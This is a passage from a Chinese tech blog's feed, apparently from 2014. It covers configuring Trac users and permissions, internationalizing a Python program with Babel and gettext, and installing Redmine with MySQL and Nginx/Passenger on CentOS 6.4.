   &#24863;&#35273; &lt;code&gt;trac&lt;/code&gt; &#30340;&#20013;&#25991;&#21270;&#20570;&#24471;&#36824;&#19981;&#22815;&#24443;&#24213;&#65292;&#20294;&#26159;&#20851;&#38190;&#30340;&#37096;&#20301;&#37117;&#24050;&#32463;&#20013;&#25991;&#21270;&#65292;&#19981;&#24433;&#21709;&#23545;&#25972;&#20010;&#31995;&#32479;&#30340;&#20351;&#29992;&#65292;&#26377;&#20102; &lt;code&gt;Babel&lt;/code&gt; &#30340;&#32463;&#39564;&#20043;&#21518;&#23545;&#23427;&#36827;&#34892;&#20013;&#25991;&#21270;&#26159;&#24456;&#23481;&#26131;&#30340;&#65292;&#32763;&#35793;&#21518;&#25552;&#20132;&#32473; &lt;code&gt;trac&lt;/code&gt; &#24320;&#21457;&#20154;&#21592;&#65292;&#20063;&#31639;&#26159;&#22238;&#39304;&#24320;&#28304;&#31038;&#21306;&#20102;&#12290;
&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-2" class="outline-3"&gt;
&lt;h3 id="sec-2"&gt;&#37197;&#32622;&#29992;&#25143;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-2"&gt;


&lt;ul&gt;
&lt;li&gt;&#21019;&#24314;&#24080;&#21495;&#25991;&#20214; &lt;code&gt;LearnTrac/conf/users.digest&lt;/code&gt;




&lt;pre class="src src-sh"&gt;&lt;span style="color: #eeeeec;"&gt;user&lt;/span&gt;=admin
&lt;span style="color: #eeeeec;"&gt;realm&lt;/span&gt;=localhost
&lt;span style="color: #eeeeec;"&gt;password&lt;/span&gt;=admin
&lt;span style="color: #eeeeec;"&gt;file&lt;/span&gt;=LearnTrac/conf/users.digest
&lt;span style="color: #729fcf;"&gt;echo&lt;/span&gt; ${&lt;span style="color: #eeeeec;"&gt;user&lt;/span&gt;}:${&lt;span style="color: #eeeeec;"&gt;realm&lt;/span&gt;}:$(&lt;span style="color: #fa8072;"&gt;printf&lt;/span&gt; &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"${user}:${realm}:${password}"&lt;/span&gt; | md5sum - | sed -&lt;span style="text-decoration: underline;"&gt;e 's/\s\+-//') &amp;gt;&amp;gt; ${file}&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#37325;&#26032;&#21551;&#21160;&#26381;&#21153;




&lt;pre class="src src-python"&gt;tracd -p 8080 --auth=&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"LearnTrac,LearnTrac/conf/users.digest,localhost"&lt;/span&gt; LearnTrac
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;
   &#29616;&#22312;&#21487;&#20197;&#20351;&#29992; &lt;code&gt;admin&lt;/code&gt; &#24080;&#21495;&#30331;&#24405;&#20102;
&lt;/p&gt;
&lt;p&gt;
   &#24080;&#21495;&#31649;&#29702;&#26041;&#38754; &lt;code&gt;trac&lt;/code&gt; &#27604;&#36739;&#24369;&#65292;&#21482;&#33021;&#36890;&#36807; &lt;code&gt;trac-admin&lt;/code&gt; &#21629;&#20196;&#34892;&#24037;&#20855;&#26469;&#31649;&#29702;&#65292;&#23567;&#22242;&#38431;&#20351;&#29992;&#36824;&#26159;&#21487;&#20197;&#25509;&#21463;&#30340;&#65292;&#21478;&#22806;&#20165;&#25903;&#25345;HTTP&#35748;&#35777;&#65292;&#37197;&#19978;HTTPS&#24067;&#32626;&#21040;&#22806;&#32593;&#20063;&#31639;&#26159;&#19981;&#38169;&#30340;&#36873;&#25321;&#12290;
&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-3" class="outline-3"&gt;
&lt;h3 id="sec-3"&gt;&#37197;&#32622;&#26435;&#38480;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-3"&gt;


&lt;ul&gt;
&lt;li&gt;&#20026; &lt;code&gt;admin&lt;/code&gt; &#29992;&#25143;&#36171;&#20104;&#31649;&#29702;&#21592;&#26435;&#38480;




&lt;pre class="src src-python"&gt;trac-admin LearnTrac permission add admin TRAC_ADMIN
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;
   &#29616;&#22312;&#21487;&#20197;&#22312;WEB&#30028;&#38754;&#19978;&#30475;&#21040;&#8220;&#31649;&#29702;&#8221;&#26631;&#31614;&#39029;&#20102;&#65292;&#21487;&#20197;&#22312;WEB&#30028;&#38754;&#19978;&#23545;&#26435;&#38480;&#36827;&#34892;&#37197;&#32622;&#12290;
&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;
</content></entry><entry><title type="html">python应用国际化：Babel</title><author><name>nil</name></author><link href="http://blog.kankanan.com/index.html"/><updated>2014-03-09T19:54:00Z</updated><published>2014-03-09T19:54:00Z</published><id>index.html</id><category scheme="/tags/python.html" term="python" label="python"/><category scheme="/tags/babel.html" term="babel" label="babel"/><content type="html">&lt;p&gt;
  &lt;a href="http://babel.pocoo.org/"&gt;Babel&lt;/a&gt; &#26159; &lt;code&gt;Python&lt;/code&gt; &#30340;&#19968;&#20010;&#22269;&#38469;&#21270;&#24037;&#20855;&#21253;&#65292;&#21407;&#26412;&#20026;&lt;a href="#Edgewall.org"&gt;Edgewall.org&lt;/a&gt;&#19979;&#30340;&#19968;&#20010;&#39033;&#30446;&#65292;&#29616;&#22312;&#24050;&#32463;&#36716;&#20026;&#30001;&lt;a href="#pocoo.org"&gt;pocoo.org&lt;/a&gt;&#32500;&#25252;&#12290;
&lt;/p&gt;

&lt;div id="outline-container-1" class="outline-3"&gt;
&lt;h3 id="sec-1"&gt;&#32479;&#19968;&#31649;&#29702; &lt;code&gt;Python&lt;/code&gt; &#34394;&#25311;&#29615;&#22659;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-1"&gt;





&lt;pre class="src src-sh"&gt;yaourt -S python-virtualenvwrapper
mkdir $&lt;span style="color: #eeeeec;"&gt;HOME&lt;/span&gt;/.virtualenvs
&lt;span style="color: #729fcf;"&gt;echo&lt;/span&gt; &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'export WORKON_HOME=$HOME/.virtualenvs'&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc
&lt;span style="color: #729fcf;"&gt;echo&lt;/span&gt; &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'source virtualenvwrapper.sh'&lt;/span&gt; &amp;gt;&amp;gt; ~/.bashrc
&lt;span style="color: #729fcf;"&gt;source&lt;/span&gt; ~/.bashrc
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-2" class="outline-3"&gt;
&lt;h3 id="sec-2"&gt;&#24314;&#31435;&#23398;&#20064; &lt;code&gt;Babel&lt;/code&gt; &#19987;&#29992;&#34394;&#25311;&#29615;&#22659;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-2"&gt;





&lt;pre class="src src-sh"&gt;mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-3" class="outline-3"&gt;
&lt;h3 id="sec-3"&gt;&#32534;&#35793;&#23433;&#35013; &lt;code&gt;Babel&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-3"&gt;





&lt;pre class="src src-sh"&gt;git clone https://github.com/mitsuhiko/babel.git
&lt;span style="color: #729fcf;"&gt;cd&lt;/span&gt; babel
pip install pytz
python setup.py import_cldr
pip install --editable .
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-4" class="outline-3"&gt;
&lt;h3 id="sec-4"&gt;&#24120;&#29992;&#20449;&#24687;&#22269;&#38469;&#21270;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-4"&gt;





&lt;pre class="example"&gt;&amp;gt;&amp;gt;&amp;gt; from babel import Locale
&amp;gt;&amp;gt;&amp;gt; locale = Locale('en', 'US')
&amp;gt;&amp;gt;&amp;gt; print locale.territories['CN']
China
&amp;gt;&amp;gt;&amp;gt; locale = Locale('zh')
&amp;gt;&amp;gt;&amp;gt; print locale.territories['CN']
&#20013;&#22269;
&amp;gt;&amp;gt;&amp;gt; month_names = locale.months['format']['wide'].items()
&amp;gt;&amp;gt;&amp;gt; for idx, name in sorted(month_names):
...   print name
... 
&#19968;&#26376;
&#20108;&#26376;
&#19977;&#26376;
&#22235;&#26376;
&#20116;&#26376;
&#20845;&#26376;
&#19971;&#26376;
&#20843;&#26376;
&#20061;&#26376;
&#21313;&#26376;
&#21313;&#19968;&#26376;
&#21313;&#20108;&#26376;
&amp;gt;&amp;gt;&amp;gt; from datetime import date
&amp;gt;&amp;gt;&amp;gt; from babel.dates import format_date
&amp;gt;&amp;gt;&amp;gt; today = date.today()
&amp;gt;&amp;gt;&amp;gt; print format_date(today, locale='zh')
2014&#24180;3&#26376;9&#26085;
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-5" class="outline-3"&gt;
&lt;h3 id="sec-5"&gt;&#20219;&#24847;&#20449;&#24687;&#22269;&#38469;&#21270;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-5"&gt;


&lt;ul&gt;
&lt;li&gt;&#21019;&#24314;python&#31243;&#24207;&#65306; &lt;code&gt;hello.py&lt;/code&gt;




&lt;pre class="src src-python"&gt;import gettext
gettext.bindtextdomain(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'messages'&lt;/span&gt;, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'./hello.i18n'&lt;/span&gt;)
_ = gettext.gettext
print _(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Hello'&lt;/span&gt;)
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21019;&#24314;Babel&#37197;&#32622;&#25991;&#20214;&#65306; &lt;code&gt;hello.babel&lt;/code&gt;




&lt;pre class="example"&gt;[python: hello.py]
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20934;&#22791;&#32763;&#35793;&#25104;&#20013;&#25991;




&lt;pre class="src src-sh"&gt;mkdir hello.i18n
pybabel extract -F hello.babel . -o hello.i18n/messages.pot    &lt;span style="color: #888a85;"&gt;# &lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#20174;&amp;#28304;&amp;#20195;&amp;#30721;&amp;#20013;&amp;#25552;&amp;#21462;&amp;#21487;&amp;#32763;&amp;#35793;&amp;#30340;&amp;#25991;&amp;#26412;&amp;#21040;P&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;OT&amp;#65288;PO&amp;#27169;&amp;#26495;&amp;#65289;&amp;#25991;&amp;#20214;&lt;/span&gt;
pybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    &lt;span style="color: #888a85;"&gt;# &lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#23558;POT&amp;#25991;&amp;#26412;&amp;#25335;&amp;#36125;&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;&amp;#20986;&amp;#19968;&amp;#20221;&amp;#25351;&amp;#23450;&amp;#35821;&amp;#35328;&amp;#30340;PO&amp;#25991;&amp;#20214;&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#35793;&#25104;&#20013;&#25991;&#21518;&#30340;PO&#25991;&#20214;&#65306; &lt;code&gt;./hello.i18n/zh_CN/LC_MESSAGES/messages.po&lt;/code&gt;




&lt;pre class="example"&gt;# Chinese (Simplified, China) translations for PROJECT.
# Copyright (C) 2014 ORGANIZATION
# This file is distributed under the same license as the PROJECT project.
# FIRST AUTHOR &amp;lt;EMAIL@ADDRESS&amp;gt;, 2014.
#
#, fuzzy
msgid ""
msgstr ""
"Project-Id-Version: PROJECT VERSION\n"
"Report-Msgid-Bugs-To: EMAIL@ADDRESS\n"
"POT-Creation-Date: 2014-03-09 19:08+0800\n"
"PO-Revision-Date: 2014-03-09 19:12+0800\n"
"Last-Translator: FULL NAME &amp;lt;EMAIL@ADDRESS&amp;gt;\n"
"Language-Team: zh_Hans_CN &amp;lt;LL@li.org&amp;gt;\n"
"Plural-Forms: nplurals=2; plural=(n != 1)\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=utf-8\n"
"Content-Transfer-Encoding: 8bit\n"
"Generated-By: Babel 2.0-dev\n"

#: hello.py:1
msgid "Hello"
msgstr "&#21890;"

&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#32534;&#35793;&#32763;&#35793;&#32467;&#26524;




&lt;pre class="src src-sh"&gt;pybabel compile -f -d ./hello.i18n    &lt;span style="color: #888a85;"&gt;#&lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#32534;&amp;#35793;PO&amp;#25991;&amp;#20214;&amp;#20026;MO&amp;#25991;&amp;#20214;&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#33521;&#25991;&#29615;&#22659;&#19979;&#36816;&#34892;&#31243;&#24207;




&lt;pre class="example"&gt;python ./hello.py
Hello
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20013;&#25991;&#29615;&#22659;&#19979;&#36816;&#34892;&#31243;&#24207;




&lt;pre class="example"&gt;LC_ALL=zh_CN python ./hello.py
&#21890;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#26356;&#26032; &lt;code&gt;hello.py&lt;/code&gt; &#65292;&#36861;&#21152;&#19968;&#21477;&#8220;      print _('World')&#8221;

&lt;/li&gt;
&lt;li&gt;&#23558;&#8220;World&#8221;&#32763;&#35793;&#25104;&#20013;&#25991;




&lt;pre class="src src-sh"&gt;pybabel extract -F hello.babel . -o hello.i18n/messages.pot    &lt;span style="color: #888a85;"&gt;# &lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#20174;&amp;#28304;&amp;#20195;&amp;#30721;&amp;#20013;&amp;#25552;&amp;#21462;&amp;#21487;&amp;#32763;&amp;#35793;&amp;#30340;&amp;#25991;&amp;#26412;&amp;#21040;P&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;OT&amp;#65288;PO&amp;#27169;&amp;#26495;&amp;#65289;&amp;#25991;&amp;#20214;&lt;/span&gt;
pybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    &lt;span style="color: #888a85;"&gt;# &lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#20174;POT&amp;#25991;&amp;#26412;&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;&amp;#26356;&amp;#26032;&amp;#25351;&amp;#23450;&amp;#35821;&amp;#35328;&amp;#30340;PO&amp;#25991;&amp;#20214;&lt;/span&gt;
&lt;span style="color: #888a85;"&gt;# &lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#24320;&amp;#22987;&amp;#32763;&amp;#35793;&amp;#25351;&amp;#23450;&amp;#35821;&amp;#35328;&amp;#30340;PO&amp;#25991;&amp;#20214;&amp;#65306; hello.i18n/zh_CN/LC_MESSAGES/messages.po&lt;/span&gt;
pybabel compile -f -d ./hello.i18n    &lt;span style="color: #888a85;"&gt;#&lt;/span&gt;&lt;span style="color: #888a85;"&gt;&amp;#32534;&amp;#35793;PO&amp;#25991;&amp;#20214;&amp;#20026;MO&amp;#25991;&amp;#20214;&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20877;&#27425;&#36816;&#34892;




&lt;pre class="example"&gt;LC_ALL=zh_CN python ./hello.py
&#21890;
&#19990;&#30028;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#31243;&#24207;&#20013;&#24378;&#21046;&#20351;&#29992;&#20013;&#25991;&#35821;&#35328;&#65306; &lt;code&gt;hello.cn.py&lt;/code&gt;




&lt;pre class="src src-python"&gt;import gettext

t = gettext.translation(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'messages'&lt;/span&gt;, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'./hello.i18n'&lt;/span&gt;, languages=[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'zh_CN'&lt;/span&gt;])
_ = t.gettext

print _(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'Hello'&lt;/span&gt;)
print _(&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'World'&lt;/span&gt;)
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21363;&#20351;&#26159;&#22312;&#33521;&#25991;&#29615;&#22659;&#19979;&#20063;&#36755;&#20986;&#20013;&#25991;




&lt;pre class="example"&gt;LC_ALL=en_US python ./hello.py
&#21890;
&#19990;&#30028;
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;
&lt;/div&gt;
</content></entry><entry><title type="html">CentOS 6.4下安装redmine</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/03/07_centos-62e44e0b5b8988c5redmine.html"/><updated>2014-03-07T14:17:00Z</updated><published>2014-03-07T14:17:00Z</published><id>posts/2014/03/07_centos-62e44e0b5b8988c5redmine.html</id><category scheme="/tags/linux.html" term="linux" label="linux"/><category scheme="/tags/redmine.html" term="redmine" label="redmine"/><content type="html">&lt;p&gt;
  &#26412;&#25991;&#20026;CentOS 6.4&#19979;&#23433;&#35013;redmine-2.5.0&#30340;&#31508;&#35760;&#65292;&#25353;&#29031; &lt;a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall"&gt;&#23448;&#26041;&#25991;&#26723;&lt;/a&gt; &#36827;&#34892;&#23433;&#35013;&#12290;
&lt;/p&gt;

&lt;div id="outline-container-1" class="outline-3"&gt;
&lt;h3 id="sec-1"&gt;&#23433;&#35013; &lt;code&gt;ruby&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-1"&gt;





&lt;pre class="src src-sh"&gt;yum install ruby
yum install ruby-devel
yum install rubygems
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-2" class="outline-3"&gt;
&lt;h3 id="sec-2"&gt;&#23433;&#35013; &lt;code&gt;redmine&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-2"&gt;





&lt;pre class="src src-sh"&gt;wget &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'&lt;/span&gt;
tar xzvf redmine-2.5.0.tar.gz
gem install bundler
gem install mysql2.
yum install ImageMagick ImageMagick-devel
bundle install --without development test&lt;span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"&gt;  &lt;/span&gt;
&lt;/pre&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-3" class="outline-3"&gt;
&lt;h3 id="sec-3"&gt;&#37197;&#32622; &lt;code&gt;redmine&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-3"&gt;


&lt;ul&gt;
&lt;li&gt;&#20197; root &#29992;&#25143;&#30331;&#24405; &lt;code&gt;mysql&lt;/code&gt;




&lt;pre class="src src-sh"&gt;mysql -uroot -p
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21019;&#24314; &lt;code&gt;redmine&lt;/code&gt; &#29992;&#25143;&#21450;&#24211;




&lt;pre class="src src-sql"&gt;CREATE DATABASE redmine CHARACTER SET utf8;
CREATE USER &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'redmine'&lt;/span&gt;@&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'localhost'&lt;/span&gt; IDENTIFIED BY &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'redmine'&lt;/span&gt;;
GRANT ALL PRIVILEGES ON redmine.* TO &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'redmine'&lt;/span&gt;@&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'localhost'&lt;/span&gt;;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20462;&#25913;&#25968;&#25454;&#24211;&#37197;&#32622;&#25991;&#20214;




&lt;pre class="src src-sh"&gt;cp config/database.yml.example config/database.yml
diff config/database.yml config/database.yml.example
10,11c10,11
&amp;lt;   username: redmine
&amp;lt;   password: &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"redmine"&lt;/span&gt;
---
&amp;gt;   username: root
&amp;gt;   password: &lt;span style="color: #ad7fa8; font-style: italic;"&gt;""&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21021;&#22987;&#21270;&#20250;&#35805;&#23384;&#20648;




&lt;pre class="src src-sh"&gt;rake generate_secret_token
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21019;&#24314;&#25968;&#25454;&#24211;&#34920;&#32467;&#26500;




&lt;pre class="src src-sh"&gt;&lt;span style="color: #eeeeec;"&gt;RAILS_ENV&lt;/span&gt;=production rake db:migrate
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#35299;&#20915;&#19978;&#19968;&#27493;&#21487;&#33021;&#20986;&#29616;&#30340;&#38169;&#35823;

&lt;blockquote&gt;

&lt;p&gt;rake aborted!
Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
&lt;/p&gt;
&lt;p&gt;
Tasks: TOP =&amp;gt; db:migrate =&amp;gt; environment
&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;     
     &#30830;&#23450; &lt;code&gt;mysql&lt;/code&gt; &#21551;&#21160;&#26102;&#25351;&#23450;&#30340; &lt;code&gt;mysql.sock&lt;/code&gt; &#25991;&#20214;&#30340;&#36335;&#24452;
&lt;/p&gt;



&lt;pre class="src src-sh"&gt;ps aux | grep mysql.sock
&lt;/pre&gt;


&lt;p&gt;
     &#26174;&#31034;&#30340; &lt;code&gt;mysql.sock&lt;/code&gt; &#36335;&#24452;&#21487;&#33021;&#20026;&#8220; &lt;code&gt;--socket=/tmp/mysql.sock&lt;/code&gt; &#8221;
&lt;/p&gt;
&lt;p&gt;
     &#20462;&#25913; &lt;code&gt;redmine&lt;/code&gt; &#25968;&#25454;&#24211;&#37197;&#32622;&#65292;&#22312; &lt;code&gt;production&lt;/code&gt; &#37197;&#32622;&#20013;&#28155;&#21152; &lt;code&gt;socket&lt;/code&gt; &#39033;&#65306;
&lt;/p&gt;



&lt;pre class="example"&gt;production:
  ...
  socket: /tmp/mysql.sock
&lt;/pre&gt;


&lt;p&gt;
     &#37325;&#26032;&#36827;&#34892;&#19978;&#19968;&#27493;&#25805;&#20316;&#12290;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#21021;&#22987;&#21270;&#25968;&#25454;




&lt;pre class="src src-sh"&gt;&lt;span style="color: #eeeeec;"&gt;RAILS_ENV&lt;/span&gt;=production &lt;span style="color: #eeeeec;"&gt;REDMINE_LANG&lt;/span&gt;=zh rake redmine:load_default_data
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21019;&#24314;&#30456;&#20851;&#30446;&#24405;




&lt;pre class="src src-sh"&gt;mkdir -p tmp tmp/pdf public/plugin_assets
sudo chown -R nobody:nobody files log tmp public/plugin_assets
sudo chmod -R 755 files log tmp public/plugin_assets
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-4" class="outline-3"&gt;
&lt;h3 id="sec-4"&gt;&#35797;&#36816;&#34892; &lt;code&gt;redmine&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-4"&gt;





&lt;pre class="src src-sh"&gt;ruby script/rails server webrick -e production
&lt;/pre&gt;


&lt;ul&gt;
&lt;li&gt;&#27983;&#35272;&#22120;&#25171;&#24320;&#39029;&#38754;

&lt;p&gt;     
     &lt;a href="http://localhost:3000"&gt;http://localhost:3000&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;
     &#20351;&#29992; &#29992;&#25143;&#21517; &lt;code&gt;admin&lt;/code&gt; &#65292;&#23494;&#30721; &lt;code&gt;admin&lt;/code&gt; &#30331;&#24405;&#21518;&#65292;&#31435;&#21363;&#20462;&#25913;&#23494;&#30721;&#12290;
&lt;/p&gt;
&lt;p&gt; 
     &#20351;&#29992;&#19979;&#38754;&#30340;&#21629;&#20196;&#29983;&#25104;&#38543;&#26426;&#30340;&#23494;&#30721;&#65306;
&lt;/p&gt;



&lt;pre class="src src-sh"&gt;cat /dev/urandom | head -1 | md5sum | head -c 8
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-5" class="outline-3"&gt;
&lt;h3 id="sec-5"&gt;&#37197;&#32622; &lt;code&gt;redmine&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-5"&gt;


&lt;ul&gt;
&lt;li&gt;&#20462;&#25913; &lt;code&gt;config/settings.yml&lt;/code&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-6" class="outline-3"&gt;
&lt;h3 id="sec-6"&gt;&#20351;&#29992; &lt;code&gt;Nginx&lt;/code&gt; &#21644; &lt;code&gt;passenger&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-6"&gt;





&lt;pre class="src src-sh"&gt;wget &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'http://nginx.org/download/nginx-1.4.6.tar.gz'&lt;/span&gt;
tar xzvf nginx-1.4.6.tar.gz
gem install passenger
yum install pcre-devel
passenger-install-nginx-module
&lt;/pre&gt;


&lt;ul&gt;
&lt;li&gt;&#20132;&#20114;&#24335;&#23433;&#35013;&#36807;&#31243;

&lt;ul&gt;
&lt;li&gt;Automatically download and install Nginx?

&lt;p&gt;       
       &#36873; 2. No: I want to customize my Nginx installation. (for advanced users)
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Where is your Nginx source code located?

&lt;p&gt;       
       &#22635;&#35299;&#21387;&#30340; &lt;code&gt;nginx&lt;/code&gt; &#28304;&#30721;&#21253;&#36335;&#24452;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Where do you want to install Nginx to?

&lt;p&gt; 
       &#22635; &lt;code&gt;/usr/local/nginx&lt;/code&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;/li&gt;
&lt;li&gt;&#20462;&#25913; /usr/local/nginx/conf/nginx.conf

&lt;p&gt; 
       &#22312;&#26368;&#21518;&#30340; &lt;code&gt;}&lt;/code&gt; &#21069;&#28155;&#21152;&#20197;&#19979;&#37197;&#32622;
&lt;/p&gt;



&lt;pre class="example"&gt;include vhosts/*.conf;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#28155;&#21152;&#31449;&#28857;&#37197;&#32622;&#25991;&#20214; &lt;code&gt;/usr/local/nginx/conf/vhosts/redmine.conf&lt;/code&gt;




&lt;pre class="example"&gt;server {
  listen  80;
  server_name &amp;lt;&#22495;&#21517;&amp;gt;;
  root &amp;lt;redmine&#26681;&#30446;&#24405;&amp;gt;/public;
  passenger_enabled on;
  client_max_body_size 10m; # Max attachemnt size
}
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#21551;&#21160; &lt;code&gt;nginx&lt;/code&gt;




&lt;pre class="src src-sh"&gt;/usr/local/nginx/sbin/nginx
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#29616;&#22312;&#21487;&#20197;&#27491;&#24335;&#35775;&#38382;&#31449;&#28857;&#20102;

&lt;p&gt;
     &lt;a href="http://"&gt;http://&lt;/a&gt;&amp;lt;&#22495;&#21517;&amp;gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-7" class="outline-3"&gt;
&lt;h3 id="sec-7"&gt;&#25903;&#25345; &lt;code&gt;OpenID&lt;/code&gt; &#31532;&#19977;&#26041;&#24080;&#21495;&#30331;&#24405;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-7"&gt;


&lt;ul&gt;
&lt;li&gt;&#23433;&#35013; &lt;code&gt;openid&lt;/code&gt; &#24211;




&lt;pre class="src src-sh"&gt;gem install ruby-openid
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20351;&#29992; &lt;code&gt;admin&lt;/code&gt; &#24080;&#21495;&#30331;&#24405;&#31995;&#32479;&#65292;&#22312;&#8220;&#31649;&#29702; - &#37197;&#32622; - &#35748;&#35777;&#8221;&#20013;&#21246;&#36873;&#19978;&#8220;&#20801;&#35768;&#20351;&#29992;OpenID&#30331;&#24405;&#21644;&#27880;&#20876;&#8221;&#12290; 

&lt;/li&gt;
&lt;li&gt;&#29992;&#25143;&#27880;&#20876;&#26102;&#8220;&#23494;&#30721;&#8221;&#21487;&#20197;&#30465;&#30053;&#65292; &#22635;&#19978; &lt;code&gt;OpenID URL&lt;/code&gt; &#21363;&#21487;&#12290;

&lt;/li&gt;
&lt;li&gt;&#22914;&#20309;&#33719;&#24471;Google&#30340;OpenID URL&#65311;

&lt;ul&gt;
&lt;li&gt;&#20808;&#22312; &lt;code&gt;Google&lt;/code&gt; &#30340;&#31449;&#28857;&#19978;&#30331;&#24405;
&lt;/li&gt;
&lt;li&gt;&#25171;&#24320; &lt;a href="https://profiles.google.com"&gt;https://profiles.google.com&lt;/a&gt; &#21518;&#20250;&#36339;&#36716;&#21040;&#31867;&#20284;&#36825;&#26679;&#65288; &lt;code&gt;https://plus.google.com/000000000000000000000/posts&lt;/code&gt; &#65289;&#30340;&#32593;&#39029;
&lt;/li&gt;
